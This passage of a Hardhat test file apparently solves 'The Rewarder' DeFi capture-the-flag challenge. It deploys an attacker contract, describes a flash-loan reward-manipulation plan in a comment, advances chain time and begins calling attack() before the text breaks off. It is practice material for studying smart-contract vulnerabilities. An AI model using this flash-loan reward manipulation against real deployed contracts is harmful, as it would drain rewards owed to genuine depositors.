...
describe('[Challenge] The rewarder', function () {
    ...
    before(async function () {
        ...
        // @notice Smart contract deployement
        const HackerRewardsFactory = await ethers.getContractFactory("TheRewarderAttacker", attacker);
        this.hackerRewards = await HackerRewardsFactory.deploy();
    ...
    it('Exploit', async function () {
        /** In order to hack this contract, I need to create a function that will allow me
         * to ask flash loan for DVT token and deposit it, withdraw it to get rewards,
         * then pay back my loan and transfer the rewards to my wallet
         */
        
        // Advance the time by day to When Depositing i can get rewards
        await ethers.provider.send("evm_increaseTime",[5 * 24 * 60 * 60]);
        // Attack!!!
        await this.hackerRewards.connect(attacker).attack(
